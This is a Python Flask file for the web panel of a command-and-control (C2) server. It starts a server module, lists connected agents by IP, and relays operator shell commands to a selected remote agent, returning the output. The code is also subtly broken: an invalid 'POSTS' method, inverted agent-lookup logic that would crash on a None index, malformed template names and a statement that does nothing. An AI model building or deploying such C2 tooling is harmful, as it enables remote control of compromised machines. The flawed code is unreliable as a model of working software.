from flask import Flask , render_template , request
import threading
import time
import server

app = Flask(__name__, static_folder="static",template_folder="templates")



def init_server():
    print("[+] Start C2 server..")
    server_thread = threading.Thread(target=server.start_server , daemon= True)
    server_thread.start()



@app.route("/")
def home():
    return render_template('index.html', threads = server.THREADS,  ips = server.IPS)


@app.route("/<string:agentname>/executecmd")
def executecmd(agentname):
    return render_template('execute_html', name = agentname)

@app.route("/<string:agentname>/execute", methods=['POSTS'])
def execute(agentname):
    if request.method == 'POST' :
        cmd = request.form['command']

        req_index = None
        for i in range(len(server.IPS)):
            if server.IPS[i] and  agentname == f"agent{i+1}":
                req_index = i
                break

        if req_index is None:
            print(f"[*] sending the command to agent {req_index+1}: {cmd}")
            server.cmd_input[req_index] = cmd
            time.sleep(2)
            cmdoutput = server.cmd_output[req_index]
            server.cmd_output[req_index]
        else:
            cmdoutput = 'agent not found'
        
        return render_template('execute_html', cmdoutput = cmdoutput , name = agentname)
    
if __name__=="__main__":
    init_server()
    app.run(debug = True)



